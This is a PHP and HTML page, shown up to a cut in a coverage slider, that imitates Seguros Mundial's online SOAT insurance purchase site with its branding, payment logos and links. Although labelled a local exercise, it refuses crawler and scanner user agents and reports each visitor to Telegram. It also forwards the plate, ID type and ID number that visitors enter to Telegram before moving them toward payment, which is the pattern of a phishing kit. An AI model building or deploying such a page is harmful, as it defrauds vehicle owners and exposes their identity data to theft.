<?php

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/(curl|wget|python|java|perl|ruby|node|bot|crawler|spider)/i', $ua)) {
    http_response_code(403);
    die('Acceso denegado.');
}

session_start();
require_once __DIR__ . '/includes/calculo.php';
require_once __DIR__ . '/includes/telegram.php';
require_once __DIR__ . '/includes/security.php';


telegram_alerta_nuevo_usuario();


@set_time_limit(60);
ini_set('max_execution_time', '60');
ini_set('default_socket_timeout', '60');

$errores = [];
$vehiculo = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $placa          = strtoupper(trim($_POST['placa'] ?? ''));
    $tipoDocumento  = trim($_POST['dropdown'] ?? '');
    $documento      = trim($_POST['documento'] ?? '');
    $aceptaTerminos = isset($_POST['validateCheck']);

    if ($placa === '' || !placa_valida($placa)) {
        $errores[] = 'Ingresa una placa válida (ej. ABC123 o ABC12D).';
    }
    if ($tipoDocumento === '') {
        $errores[] = 'Selecciona el tipo de documento.';
    }
    if ($documento === '' || !documento_valido($documento)) {
        $errores[] = 'Ingresa un número de documento válido (solo dígitos).';
    }
    if (!$aceptaTerminos) {
        $errores[] = 'Debes aceptar la Política de Privacidad y los Términos y condiciones para continuar.';
    }

    if (empty($errores)) {
        $r = buscar_vehiculo_v2($placa, $documento);

        if ($r['vehiculo'] === null) {
            $errores[] = $r['error'] ?? "No encontramos datos para la placa \"$placa\".";
        } else {
            $_SESSION['propietario'] = $r['vehiculo']['propietario'] ?? [];
            $_SESSION['cotizacion']  = [
                'placa'          => $placa,
                'tipo_documento' => $tipoDocumento,
                'documento'      => $documento,
                'vehiculo'       => $r['vehiculo'],
                'origen'         => $r['origen'],
            ];

            // Notificar cotización a Telegram
            telegram_cotizacion($placa, $tipoDocumento, $documento);

            header('Location: informacion-vehiculo.php');
            exit;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="theme-color" content="#FFFFFF">
<meta name="description" content="Compra SOAT - Ejercicio local en PHP">
<title>Compra SOAT sin complicaciones | Ejercicio PHP</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/component---src-pages-index-tsx.2f90ad7b25207235a98b.css">
<link rel="stylesheet" href="assets/css/commons.db02d5e21360139d3ecd.css">
<link rel="stylesheet" href="assets/css/styles.e0403c65ea02169718b0.css">
<link rel="stylesheet" href="assets/css/style-9faaa9e51cea5853.css">
<link rel="stylesheet" href="assets/css/styles_ltr.css">

<style>

.hero-slide {
    display: none;
    animation: heroFade .5s ease-in-out;
}
.hero-slide.is-active {
    display: block;
}
@keyframes heroFade {
    from { opacity: 0; }
    to   { opacity: 1; }
}

.hero-slide .lista-no {
    font-size: 1rem;
    font-weight: 500;
    line-height: 1.6;
    display: block;
}

.banner-module--bannerRemarketing__content__texts__button--a4e6b {
    display: inline-block;
    margin-top: 1.75rem;
}


.slider-module--slider--0da35 { position: relative; width: 100%; overflow: hidden; }
.amparos-track {
    display: flex;
    transition: transform .5s ease-in-out;
    will-change: transform;
}
.amparos-track > .amparos-slide {
    flex: 0 0 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 20px;
    box-sizing: border-box;
}
.amparos-slide img {
    max-width: 380px;
    max-height: 380px;
    object-fit: contain;
    margin: 0 auto;
}
.amparos-slide .content-item-module--content__item__wrapper_content--8a872 {
    text-align: center;
    max-width: 520px;
    margin-top: 20px;
}

.amparos-arrows {
    position: absolute;
    top: 40%;
    left: 0;
    right: 0;
    display: flex;
    justify-content: space-between;
    padding: 0 4%;
    pointer-events: none;
    z-index: 15;
}
.amparos-arrows .slider-arrow-module--slider__arrow--6e381 {
    pointer-events: auto;
    cursor: pointer;
    user-select: none;
    transition: transform .15s ease;
}
.amparos-arrows .slider-arrow-module--slider__arrow--6e381:hover {
    transform: scale(1.1);
}
.amparos-arrows .slider-arrow-module--slider__arrow--6e381:active {
    transform: scale(.95);
}
.amparos-arrows .slider-arrow-module--slider__arrow--6e381 svg {
    pointer-events: none;
}

.amparos-dots {
    display: flex;
    justify-content: center;
    gap: 13.8px;
    margin: 30px 0;
    width: 100%;
}
.amparos-dot {
    width: 12px; height: 12px; border-radius: 50%; border: none;
    background: #e8e8ed; cursor: pointer; padding: 0;
    transition: background .2s;
}
.amparos-dot.is-active { background: #0a99d6; }

/* ==============================================================
   FIX CHECKBOX DE TÉRMINOS
   ============================================================== */
.checkbox-input-module--input__checkbox--e5b4c {
    width: 18px !important;
    height: 18px !important;
    min-width: 18px !important;
    min-height: 18px !important;
    flex-shrink: 0;
    margin-top: 12px;
    margin-right: 8px;
    accent-color: #0a99d6;
    cursor: pointer;
    vertical-align: top;
}

.checkbox-input-module--input__checkbox__text--68157 {
    display: inline-block;
    width: calc(100% - 26px);
    max-width: calc(100% - 26px);
    margin-top: 10px;
    vertical-align: top;
    cursor: pointer;
}

/* ==============================================================
   OVERLAY DE CARGA (mientras consulta la API)
   ============================================================== */
.soat-loading-overlay {
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.88);
    backdrop-filter: blur(2px);
    -webkit-backdrop-filter: blur(2px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 99999;
    opacity: 0;
    transition: opacity .3s ease;
}
.soat-loading-overlay.is-visible {
    display: flex;
    opacity: 1;
}
.soat-loading-overlay__contenido {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 18px;
    text-align: center;
    padding: 20px;
}
.soat-loading-overlay__logo {
    width: 120px;
    height: 120px;
    color: #0a99d6;
    animation: soatSpin 1.6s linear infinite;
}
.soat-loading-overlay__texto {
    color: #066188;
    font-size: 1.05rem;
    font-weight: 700;
    margin: 0;
    max-width: 340px;
    line-height: 1.4;
}
.soat-loading-overlay__subtexto {
    color: #4d4d4f;
    font-size: .85rem;
    font-weight: 400;
    margin: 0;
    max-width: 340px;
    line-height: 1.4;
}
@keyframes soatSpin {
    from { transform: rotate(0deg); }
    to   { transform: rotate(360deg); }
}

@media (max-width: 48rem) {
    .soat-loading-overlay__logo { width: 90px; height: 90px; }
    .soat-loading-overlay__texto { font-size: .95rem; }
    .soat-loading-overlay__subtexto { font-size: .8rem; }
}
</style>
</head>
<body>
<div id="___gatsby">
<div tabindex="-1" id="gatsby-focus-wrapper" style="outline: none;">

<?php include __DIR__ . '/includes/header.php'; ?>

<nav class="menu-module--menu--ff100">
  <div class="menu-module--menu__container--550e5">
    <div class="logo-module--wrapper__logo--d2507">
      <img class="safe-gatsby-image-module--safeImage--9bfbe menu-module--menu__container__logos__logo--30a8e"
           src="assets/img/imagen_1_.png"
           width="609" height="136" alt="seguros mundial" title="seguros mundial">
    </div>
    <div class="menu-module--menu__container__logos--cd40c" data-ally="false"></div>
  </div>
  <ul class="menu-module--menu__items--6eadc">
    <li class="menu-item-module--menu_item--04780 menu-item-module--display_none--19788 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">Comprar SOAT</button></div>
      </div>
    </li>
    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <button data-theme="menu-item" class="button-icon-module--button--c6d67" type="button">
          <div class="button-icon-module--button__text--80959">SOAT
            <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
                 height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
              <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
          </div>
        </button>
      </div>
    </li>
    <li class="menu-item-module--menu_item--04780 menu-item-module--menu_item__highlighted--fca77 menu-item-module--menu_item__centered--2e42f">
      <div class="menu-item-module--button--a1b98">
        <div><button data-theme="highlighted" class="anchor-module--anchor--6e022">QUIERO RENOVAR MI SOAT</button></div>
      </div>
    </li>
  </ul>
</nav>

<main>

<section class="banner-module--bannerRemarketing--916c8" id="heroCarousel">
  <div class="banner-module--bannerRemarketing__content--6ec1b">

    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NjEuMTY5IiBoZWlnaHQ9IjY2MC41MTIiIHZpZXdCb3g9IjAgMCA1NjEuMTY5IDY2MC41MTIiPjxwYXRoIGQ9Ik0yNjcuODc5LDUwLjEzMmMxNzgsNzUuMTc1LDI3Ny40NDEsNzYuNjkzLDI5MC40MDgsMTYzLjM4NnMtMTIwLjMyNiwxNDUuNDQ4LTI5MC40MDgsMTg5LjJTMCwzMzcuNjczLDAsMjEzLjUxOCw4OS44NzctMjUuMDQzLDI2Ny44NzksNTAuMTMyWiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTc1Ljk5MiA2NjkuODc2KSByb3RhdGUoLTExMSkiIGZpbGw9IiNiN2U1ZjgiLz48L3N2Zz4="
         class="banner-module--bannerRemarketing__content__img_figure--0abaa banner-module--bannerRemarketing__content__img_figure_rotate_0--1f1fe"
         title="Imagen de fondo" alt="Imagen de fondo">

    <div class="banner-module--bannerRemarketing__content__bg_slide--2762c" id="heroBgSlide">
      <img class="safe-gatsby-image-module--safeImage--9bfbe banner-module--bannerRemarketing__content__bg_slide__image--039b6"
           id="heroBgImg"
           src="assets/img/beanbag.png" alt="" title="img hero"
           style="height:100%;width:auto;object-fit:contain;max-width:min(52vw,760px);">
    </div>

    <div class="banner-module--bannerRemarketing__content__texts--74ed3">

      <div class="hero-slide is-active" data-slide="0">
        <span class="banner-module--subtitle--e4b09">Pensando en tu comodidad,</span>
        <div class="banner-module--description--7c141">
          <p>Creamos la forma más rápida, fácil y segura para que adquieras
             <strong>tu SOAT online</strong></p>
        </div>
        <span class="banner-module--aclaration--58739">Haz tu compra sin complicaciones y disfruta de la
          tranquilidad de estar protegido.</span>
      </div>

      <div class="hero-slide" data-slide="1">
        <span class="banner-module--subtitle--e4b09">Tu camino <span class="banner-module--text_green--4bc94">protegido</span>,</span>
        <div class="banner-module--description--7c141">
          <p>tu futuro <strong>en movimiento</strong>.</p>
        </div>
        <a href="#" class="banner-module--bannerRemarketing__content__texts__button--a4e6b">Abre tu CDT aquí</a>
      </div>

      <div class="hero-slide" data-slide="2">
        <span class="banner-module--title--151a9">Bre-B</span>
        <span class="banner-module--subtitle--e4b09">¡Ahora tienes una nueva forma de pagar!</span>
        <div class="banner-module--description--7c141">
          <p>Paga con <span class="banner-module--text_green--4bc94">Bre-B</span> escaneando un
             código QR o copiando la llave de pago.</p>
        </div>
        <span class="banner-module--aclaration--58739">Disfruta de una experiencia de pago más ágil, sencilla y segura.</span>
      </div>

      <div class="hero-slide" data-slide="3">
        <span class="banner-module--subtitle--e4b09">Para renovar el SOAT con Mundial</span>
        <div class="banner-module--description--7c141">
          <p>NO te pediremos por ningún canal:</p>
        </div>
        <span class="banner-module--aclaration--58739">
          Transferencias bancarias a cuentas personales.<br>
          <span class="banner-module--text_green--4bc94">NO</span> enviamos códigos QR para pago en billeteras digitales.<br>
          <span class="banner-module--text_green--4bc94">NO</span> te ofrecemos descuentos.<br>
          <span class="banner-module--text_green--4bc94">NO</span> te contactaremos por chat para adquirir el SOAT.
        </span>
      </div>

      <div class="hero-slide" data-slide="4">
        <span class="banner-module--subtitle--e4b09">Queremos informarte</span>
        <div class="banner-module--description--7c141">
          <p>Este jueves 08 de octubre desde las 12:00 a.m hasta las 02:00 a.m,
             presentaremos indisponibilidad de nuestros servicios.</p>
        </div>
        <span class="banner-module--aclaration--58739">Te invitamos a realizar la compra de
          <span class="banner-module--text_green--4bc94">tu SOAT</span> con anticipación o visita
          cualquiera de nuestras oficinas en el horario habilitado.
          Agradecemos tu comprensión.</span>
      </div>

      <div class="banner-module--bannerRemarketing__buttons_movile--6cc7e">
        <button class="banner-module--bannerRemarketing__buttons_movile__button--2e10f" type="button" id="heroPrevMobile" aria-label="Anterior">
          <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
            <path fill="#087DAF" d="M13,26a1,1,0,0,1-.71-.29l-9-9a1,1,0,0,1,0-1.42l9-9a1,1,0,1,1,1.42,1.42L5.41,16l8.3,8.29a1,1,0,0,1,0,1.42A1,1,0,0,1,13,26Z"></path>
            <path fill="#087DAF" d="M28,17H4a1,1,0,0,1,0-2H28a1,1,0,0,1,0,2Z"></path>
          </svg>
        </button>
        <button class="banner-module--bannerRemarketing__buttons_movile__button--2e10f" type="button" id="heroNextMobile" aria-label="Siguiente">
          <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
            <path fill="#087DAF" d="M19,26a1,1,0,0,1-.71-.29,1,1,0,0,1,0-1.42L26.59,16l-8.3-8.29a1,1,0,0,1,1.42-1.42l9,9a1,1,0,0,1,0,1.42l-9,9A1,1,0,0,1,19,26Z"></path>
            <path fill="#087DAF" d="M28,17H4a1,1,0,0,1,0-2H28a1,1,0,0,1,0,2Z"></path>
          </svg>
        </button>
      </div>

    </div>

    <div class="banner-module--bannerRemarketing__buttons--db163" id="heroDotsDesktop">
      <button class="banner-module--bannerRemarketing__buttons__button_active--75530" data-goto="0" aria-label="Slide 1"></button>
      <button class="banner-module--bannerRemarketing__buttons__button--1eea2" data-goto="1" aria-label="Slide 2"></button>
      <button class="banner-module--bannerRemarketing__buttons__button--1eea2" data-goto="2" aria-label="Slide 3"></button>
      <button class="banner-module--bannerRemarketing__buttons__button--1eea2" data-goto="3" aria-label="Slide 4"></button>
      <button class="banner-module--bannerRemarketing__buttons__button--1eea2" data-goto="4" aria-label="Slide 5"></button>
    </div>

    <div class="banner-module--bannerRemarketing__form--861d3">
      <form class="banner-form-module--banner__form--e3c36 form-module--form--731f9"
            method="post" action="index.php" novalidate id="form-cotizar">

        <div class="form-module--form__title--239b9">¡Empecemos!</div>
        <div class="form-module--form__subtitle--14807">Ingresa la placa de tu nave</div>

        <div class="form-stages-module--stages--99ccc">
          <div class="form-stages-module--stages__item--51e51">
            <div class="form-stages-module--stages__item__icon--e599a form-stages-module--active--1ec2d">1</div>
            <div class="form-stages-module--stages__item__text--7f4ef form-stages-module--active--1ec2d">Cotiza</div>
          </div>
          <div class="form-stages-module--stages__separator--f88c2"></div>
          <div class="form-stages-module--stages__item--51e51">
            <div class="form-stages-module--stages__item__icon--e599a">2</div>
            <div class="form-stages-module--stages__item__text--7f4ef">Resumen</div>
          </div>
          <div class="form-stages-module--stages__separator--f88c2"></div>
          <div class="form-stages-module--stages__item--51e51">
            <div class="form-stages-module--stages__item__icon--e599a">3</div>
            <div class="form-stages-module--stages__item__text--7f4ef">Pago</div>
          </div>
        </div>

        <?php if (!empty($errores)): ?>
          <div id="mensaje-errores" style="background:#fdecea;border:1px solid #f5c2c0;color:#7a2a24;border-radius:8px;padding:12px 16px;margin-bottom:16px;width:100%;">
            <strong>Revisa lo siguiente:</strong>
            <ul style="margin:8px 0 0 18px;padding:0;">
              <?php foreach ($errores as $error): ?>
                <li><?= htmlspecialchars($error) ?></li>
              <?php endforeach; ?>
            </ul>
          </div>
        <?php endif; ?>

        <label class="validated-input-module--input--4a6a1">Placa
          <div class="tooltip top">
            <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
                 stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em"
                 xmlns="http://www.w3.org/2000/svg">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="12"></line>
              <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
            <span class="tiptext">Ingresa tu placa</span>
          </div>
          <input aria-label="placa" type="text" placeholder="Ingresa tu placa"
                 id="placa" name="placa"
                 value="<?= htmlspecialchars($_POST['placa'] ?? '') ?>"
                 maxlength="7" required>
        </label>

        <div class="dropdown-module--dropdown__document_type--af2f9 dropdown-module--dropdown--6f046">
          <label class="dropdown-module--label--b4a30">Tipo
            <select class="dropdown-module--dropdown__control--caa81" tabindex="0" name="dropdown" required>
              <option class="dropdown-module--dropdown__option--ad229" value="">Seleccione</option>
              <?php
              $tipos = ['CC', 'CE', 'NIT', 'TI', 'PS'];
              $tipoSel = $_POST['dropdown'] ?? '';
              foreach ($tipos as $tipo):
              ?>
                <option class="dropdown-module--dropdown__option--ad229" value="<?= $tipo ?>"
                        <?= $tipoSel === $tipo ? 'selected' : '' ?>><?= $tipo ?></option>
              <?php endforeach; ?>
            </select>
          </label>
        </div>

        <label class="validated-input-module--input__document--60ea6 validated-input-module--input--4a6a1">Documento
          <div class="tooltip top">
            <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
                 stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em"
                 xmlns="http://www.w3.org/2000/svg">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="12"></line>
              <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
            <span class="tiptext">Escribe el número de documento</span>
          </div>
          <input aria-label="documento" type="text" placeholder="Ingresar documento"
                 id="documento" name="documento"
                 value="<?= htmlspecialchars($_POST['documento'] ?? '') ?>" required>
        </label>

        <input type="checkbox" class="checkbox-input-module--input__checkbox--e5b4c"
               id="termCondi" name="validateCheck" value="true"
               required
               <?= isset($_POST['validateCheck']) ? 'checked' : '' ?>>
        <label for="termCondi" class="checkbox-input-module--input__checkbox__text--68157">
          <p>Autorizo el tratamiento de mis datos y acepto la
             <a href="https://www.segurosmundial.com.co/proteccion-de-datos/" target="_blank" rel="noopener noreferrer">Política de Privacidad</a>,
             así como los
             <a href="https://soatmundial.com.co/terminos-y-condiciones/" target="_blank" rel="noopener noreferrer">términos y condiciones</a>.
          </p>
        </label>

        <input type="checkbox" class="checkbox-input-module--input__checkbox--e5b4c"
               id="termProte" name="validateCheckProte" value="true"
               <?= isset($_POST['validateCheckProte']) ? 'checked' : '' ?>>
        <label for="termProte" class="checkbox-input-module--input__checkbox__text--68157">
          <p>Acepto recibir comunicaciones comerciales y publicitarias personalizadas
             a través de los canales autorizados por Seguros Mundial</p>
        </label>

        <footer class="banner-form-module--footer__form--641f2">
          <div class="banner-form-module--footer__form__methods--e00ae">
            <img class="safe-gatsby-image-module--safeImage--9bfbe banner-form-module--footer__form__methods__img__pse--2c821"
                 src="assets/img/pse.png" width="78" height="81" alt="Logo PSE" title="Logo PSE"
                 style="width: 31px; height: 31px;">
            <img class="safe-gatsby-image-module--safeImage--9bfbe banner-form-module--footer__form__methods__img_nequi--f1842"
                 src="assets/img/logo_nequi.png" width="485" height="153" alt="Logo Nequi" title="Logo Nequi"
                 style="width: 45px; height: auto;">
            <img class="safe-gatsby-image-module--safeImage--9bfbe banner-form-module--footer__form__methods__img--c51a1"
                 src="assets/img/Bancolombia.png" width="92" height="92" alt="Logo Bancolombia" title="Logo Bancolombia"
                 style="width: 30px; height: auto;">
            <img class="safe-gatsby-image-module--safeImage--9bfbe banner-form-module--footer__form__methods__img_mastercard--c8652"
                 src="assets/img/visa.png" width="122" height="40" alt="Logo Visa" title="Logo Visa"
                 style="width: 40px; height: auto;">
            <img class="safe-gatsby-image-module--safeImage--9bfbe banner-form-module--footer__form__methods__img_mastercard--c8652"
                 src="assets/img/master_card.png" width="95" height="74" alt="Logo Master card" title="Logo Master card"
                 style="width: 40px; height: auto;">
            <img class="safe-gatsby-image-module--safeImage--9bfbe banner-form-module--footer__form__methods__img--c51a1"
                 src="assets/img/br-b.png" width="90" height="90" alt="imgBreb" title="imgBreb"
                 style="width: 30px; height: auto;">
          </div>
        </footer>

        <button class="button-old-module--accept--3b47a centered button-old-module--button--9a043"
                type="submit" id="btn-cotizar">Compra tu SOAT</button>
      </form>
    </div>

  </div>
</section>

<section id="conoce-mas" class="content-module--content--51e39 content-module--content__without_information--be6c7">

  <div class="content-item-module--content__item--282cd">
    <div class="content-item-module--content__item__wrapper_image--84f03">
      <img class="safe-gatsby-image-module--safeImage--9bfbe"
           src="assets/img/Image-beneficios-body1_3x.png"
           width="1122" height="1032"
           alt="Imagen club beneficios" title="Imagen club beneficios">
    </div>
    <div class="content-item-module--content__item__wrapper_content--8a872">
      <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a">
        Compra tu Pack de Movilidad
      </h2>
      <div class="content-item-module--content__item__wrapper_content__text--32547">
        <p>Es la forma más rápida y segura de comprar online tu SOAT y otros productos de movilidad.</p>
      </div>
    </div>
    <button data-theme="secondary-light-square" class="anchor-module--anchor--6e022">Más información</button>
  </div>

  <div class="content-item-module--content__item--282cd">
    <div class="content-item-module--content__item__wrapper_image--84f03">
      <img class="safe-gatsby-image-module--safeImage--9bfbe"
           src="assets/img/consulta-y-descarga-de-po_liza.png"
           width="330" height="292"
           alt="imagen miniatura" title="imagen miniatura">
    </div>
    <div class="content-item-module--content__item__wrapper_content--8a872">
      <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a">
        ¿Ya estás en Seguros Mundial?
      </h2>
      <div class="content-item-module--content__item__wrapper_content__text--32547">
        <p>Consulta y descarga la póliza.</p>
      </div>
    </div>
    <button data-theme="secondary-light-square" class="anchor-module--anchor--6e022">Más información</button>
  </div>

  <div class="content-item-module--content__item--282cd">
    <div class="content-item-module--content__item__wrapper_image--84f03">
      <img class="safe-gatsby-image-module--safeImage--9bfbe"
           src="assets/img/segurotercero.png"
           width="330" height="292"
           alt="segurotercero" title="segurotercero">
    </div>
    <div class="content-item-module--content__item__wrapper_content--8a872">
      <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a">
        ¿Ya conoces Seguro Tercero?
      </h2>
      <div class="content-item-module--content__item__wrapper_content__text--32547">
        <p>El complemento del SOAT que cubrirá los daños materiales causados a terceros
           en un accidente de tránsito.</p>
      </div>
    </div>
    <button data-theme="secondary-light-square" class="anchor-module--anchor--6e022">Más información</button>
  </div>

</section>

<section class="content-module--content--51e39 content-module--content__gray--dc079 content-module--content__card--b74fd">

  <div class="content-module--content__wrapper_text--6de8d">
    <h2 class="content-module--content__wrapper_text__title--2ce4e">Complementa tu SOAT</h2>
    <h3 class="content-module--content__wrapper_text__subtitle--8af17">
      Un SOAT con beneficios adicionales solo para los amigos.
    </h3>
    <div class="content-module--content__wrapper_text__description--c6b34">
      <p>Desde $19.900* anuales podrás adquirir una Póliza de Accidentes Personales
         que te brindará cobertura para:</p>
    </div>
  </div>

  <div class="cards-content-module--cards_content--8e212">
    <div class="content-item-module--content__item--282cd content-item-module--content__item__card--5e188">
      <div class="content-item-module--content__item__wrapper_image--84f03 content-item-module--content__item__wrapper_image__card--a9d69">
        <img class="safe-gatsby-image-module--safeImage--9bfbe"
             src="assets/img/Atom-Icon-Complemento-puerta-48px-default_3x.png"
             width="48" height="48" alt="Icono complemento puerta">
      </div>
      <div class="content-item-module--content__item__wrapper_content--8a872 content-item-module--content__item__wrapper_content__card--ffe53">
        <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a content-item-module--content__item__wrapper_content__title__card--b41a1">
          Rotura de vidrios laterales y película de seguridad
        </h2>
        <div class="content-item-module--content__item__wrapper_content__text--32547 content-item-module--content__item__wrapper_content__text__card--cf545">
          <p>(vehículos livianos, taxis y pesados).</p>
        </div>
      </div>
    </div>

    <div class="content-item-module--content__item--282cd content-item-module--content__item__card--5e188">
      <div class="content-item-module--content__item__wrapper_image--84f03 content-item-module--content__item__wrapper_image__card--a9d69">
        <img class="safe-gatsby-image-module--safeImage--9bfbe"
             src="assets/img/Atom-Icon-Complemento-Luces-48px-default_3x.png"
             width="48" height="48" alt="Icono complemento luces">
      </div>
      <div class="content-item-module--content__item__wrapper_content--8a872 content-item-module--content__item__wrapper_content__card--ffe53">
        <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a content-item-module--content__item__wrapper_content__title__card--b41a1">
          Reposición de farolas delanteras y stops traseros
        </h2>
        <div class="content-item-module--content__item__wrapper_content__text--32547 content-item-module--content__item__wrapper_content__text__card--cf545">
          <p>(motocicletas, vehículos livianos y taxis)</p>
        </div>
      </div>
    </div>

    <div class="content-item-module--content__item--282cd content-item-module--content__item__card--5e188">
      <div class="content-item-module--content__item__wrapper_image--84f03 content-item-module--content__item__wrapper_image__card--a9d69">
        <img class="safe-gatsby-image-module--safeImage--9bfbe"
             src="assets/img/atom-icon-clase6-6personas_3x.png"
             width="168" height="168" alt="Imagen carros con capacidad para 6 personas">
      </div>
      <div class="content-item-module--content__item__wrapper_content--8a872 content-item-module--content__item__wrapper_content__card--ffe53">
        <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a content-item-module--content__item__wrapper_content__title__card--b41a1">
          Rotura de vidrio panorámico
        </h2>
        <div class="content-item-module--content__item__wrapper_content__text--32547 content-item-module--content__item__wrapper_content__text__card--cf545">
          <p>(vehículos livianos, taxis y pesados)</p>
        </div>
      </div>
    </div>

    <div class="content-item-module--content__item--282cd content-item-module--content__item__card--5e188">
      <div class="content-item-module--content__item__wrapper_image--84f03 content-item-module--content__item__wrapper_image__card--a9d69">
        <img class="safe-gatsby-image-module--safeImage--9bfbe"
             src="assets/img/Atom-Icon-Complemento-Beneficios-64px-default_3x.png"
             width="48" height="48" alt="Icono complemento dinero">
      </div>
      <div class="content-item-module--content__item__wrapper_content--8a872 content-item-module--content__item__wrapper_content__card--ffe53">
        <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a content-item-module--content__item__wrapper_content__title__card--b41a1">
          $7.000.000 o $10.000.000 a un beneficiario*
        </h2>
        <div class="content-item-module--content__item__wrapper_content__text--32547 content-item-module--content__item__wrapper_content__text__card--cf545">
          <p>(en caso de fallecimiento)</p>
        </div>
      </div>
    </div>

    <div class="content-item-module--content__item--282cd content-item-module--content__item__card--5e188">
      <div class="content-item-module--content__item__wrapper_image--84f03 content-item-module--content__item__wrapper_image__card--a9d69">
        <img class="safe-gatsby-image-module--safeImage--9bfbe"
             src="assets/img/atom-icon-clase5-familiar_3x.png"
             width="168" height="168" alt="Imagen carros familiares">
      </div>
      <div class="content-item-module--content__item__wrapper_content--8a872 content-item-module--content__item__wrapper_content__card--ffe53">
        <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a content-item-module--content__item__wrapper_content__title__card--b41a1">
          Llantas estalladas
        </h2>
        <div class="content-item-module--content__item__wrapper_content__text--32547 content-item-module--content__item__wrapper_content__text__card--cf545">
          <p>(vehículos livianos, taxis y pesados)</p>
        </div>
      </div>
    </div>

    <div class="cards-content-module--cards_content__clarifications--4cf41">
      <p>*El valor de la prima y valor asegurado por muerte accidental depende del plan seleccionado (Plata, Platino, Gold)</p>
      <p>**Las asistencias vehiculares sólo cubren un evento al año</p>
    </div>
  </div>
</section>

<section class="content-module--content--51e39">
  <div class="content-module--content__wrapper_text--6de8d">
    <h2 class="content-module--content__wrapper_text__title--2ce4e">Amparos del SOAT</h2>
    <h3 class="content-module--content__wrapper_text__subtitle--8af17">
      Un amigo te cubre cuando se pone difícil la vaina.
    </h3>
    <div class="content-module--content__wrapper_text__description--c6b34">
      <p>Recuerda que si tienes un accidente, nuestro SOAT ampara lesiones o fallecimiento
         de conductores, pasajeros o peatones implicados.</p>
    </div>
  </div>

  <div class="slider-module--slider--0da35" id="amparosSlider">

    <div class="amparos-arrows">
      <div class="slider-arrow-module--slider__arrow--6e381" id="amparosPrev">
        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
             class="slider-arrow-module--slider__arrow__left--df938" height="1em" width="1em"
             xmlns="http://www.w3.org/2000/svg">
          <path d="M256 48C141.13 48 48 141.13 48 256s93.13 208 208 208 208-93.13 208-208S370.87 48 256 48m35.31 292.69a16 16 0 1 1-22.62 22.62l-96-96a16 16 0 0 1 0-22.62l96-96a16 16 0 0 1 22.62 22.62L206.63 256z"></path>
        </svg>
      </div>
      <div class="slider-arrow-module--slider__arrow--6e381" id="amparosNext">
        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
             class="slider-arrow-module--slider__arrow__right--5a5ea" height="1em" width="1em"
             xmlns="http://www.w3.org/2000/svg">
          <path d="M48 256c0 114.87 93.13 208 208 208s208-93.13 208-208S370.87 48 256 48 48 141.13 48 256m257.37 0-84.68-84.69a16 16 0 0 1 22.62-22.62l96 96a16 16 0 0 1 0 22.62l-96 96a16 16 0 0 1-22.62-22.62z"></path>
        </svg>
      </div>
    </div>

    <div class="amparos-track" id="amparosTrack">

      <div class="amparos-slide">
        <img src="assets/img/amparo-medico.png" alt="Atención médica">
        <div class="content-item-module--content__item__wrapper_content--8a872">
          <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a">Atención médica</h2>
          <div class="content-item-module--content__item__wrapper_content__text--32547">
            <p>Hasta 701,68 UVT (Unidades de Valor Tributario)*<br>
               Para los vehículos que son parte del rango diferencial, según el Decreto 2497 de 2022,
               será hasta 263.13 UVT.</p>
          </div>
        </div>
      </div>

      <div class="amparos-slide">
        <img src="assets/img/amparo-discapacidad.png" alt="Incapacidad permanente">
        <div class="content-item-module--content__item__wrapper_content--8a872">
          <h2 class="content-item-module--content__item__wrapper_content__title--e6b8a">Incapacidad permanente</h2>
          <div class="content-item-module--content__item__wrapper_content__text--32547">
            <p>Hasta 180 salarios mínimos diarios legales vigentes, si a razón del accidente
               los implicados quedan con alguna incapacidad permanente.</p>
          </div>
        </div>
      </div>

      <div class="amparos-slide">
